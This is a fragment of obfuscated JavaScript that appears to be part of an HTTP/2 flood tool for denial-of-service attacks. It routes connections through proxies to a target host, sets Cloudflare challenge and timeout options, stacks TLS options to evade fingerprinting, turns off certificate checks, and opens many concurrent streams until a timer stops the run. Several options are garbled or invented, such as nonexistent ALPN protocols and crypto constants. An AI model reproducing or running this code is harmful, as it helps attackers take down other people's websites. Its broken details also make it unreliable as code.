  Socker.HTTP(_0x32c453, (_0x376c19, _0x528991) => {
    if (_0x528991) {
      return;
    }
    _0x376c19.setKeepAlive(true, 0x927c0);
    const _0x5d80e8 = {
      'host': parsedTarget.host,
      'port': 0x1bb,
      'secure': true,
      'challengesToSolve': Infinity,
      'resolveWithFullResponse': true,
      'followAllRedirects': true,
      'maxRedirects': 0xa,
      'clientTimeout': 0x1388,
      'clientlareMaxTimeout': 0x2710,
      'cloudflareTimeout': 0x1388,
      'cloudflareMaxTimeout': 0x7530,
      'honorCipherOrder': true,
      'ALPNProtocols': ['h2', "http/1.1", "spdy/3.1", "http/1.2", "http/2", "http/2+quic/43", "http/2+quic/44", 'http/2+quic/44'],
      'secureOptions': crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION,
      'sigals': siga,
      'socket': _0x376c19,
      'ciphers': tls.getCiphers().join(':') + cipper,
      'ecdhCurve': "prime256v1:X25519",
      'host': parsedTarget.host,
      'rejectUnauthorized': false,
      'servername': parsedTarget.host,
      'secureProtocol': ['TLS_method', "TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
      'sessionTimeout': 0x1388
    };
    const _0x3b317e = tls.connect(0x1bb, parsedTarget.host, _0x5d80e8);
    _0x3b317e.setKeepAlive(true, 0xea60);
    const _0x696160 = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x7d0,
        'initialWindowSize': 0xffff,
        'maxHeaderListSize': 0x10000,
        'enablePush': false
      },
      'maxSessionMemory': 0xfa00,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x3b317e,
      'socket': _0x376c19
    });
    _0x696160.settings({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x7d0,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x10000,
      'enablePush': false
    });
    _0x696160.on("connect", () => {});
    _0x696160.on('close', () => {
      _0x696160.destroy();
      _0x376c19.destroy();
      return;
    });
    _0x696160.on("error", _0x3e5670 => {
      _0x696160.destroy();
      _0x376c19.destroy();
      return;
    });
  });
}
const StopScript = () => process.exit(0x1);
setTimeout(StopScript, args.time * 0x3e8);
